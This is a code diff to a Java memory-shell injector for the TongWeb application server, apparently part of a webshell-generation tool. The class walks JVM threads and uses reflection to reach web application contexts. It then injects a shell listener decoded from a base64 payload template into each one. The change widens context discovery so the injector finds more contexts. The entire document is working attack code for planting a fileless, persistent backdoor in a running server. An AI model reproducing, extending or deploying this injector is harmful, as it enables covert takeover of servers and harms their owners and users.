@@ -19,7 +19,7 @@ public class TongWebListenerInjector {
 
     public TongWebListenerInjector() {
         try {
-            List<Object> contexts = getContext();
+            Set<Object> contexts = getContext();
             for (Object context : contexts) {
                 Object listener = getShell(context);
                 inject(context, listener);
@@ -37,8 +37,8 @@ public class TongWebListenerInjector {
         return "{{base64Str}}";
     }
 
-    public List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
@@ -48,6 +48,9 @@ public class TongWebListenerInjector {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
                 }
+            } else if (thread.getContextClassLoader() != null
+                    && thread.getContextClassLoader().getClass().getSimpleName().equals("TongWebWebappClassLoader")) {
+                contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
             }
         }
         return contexts;
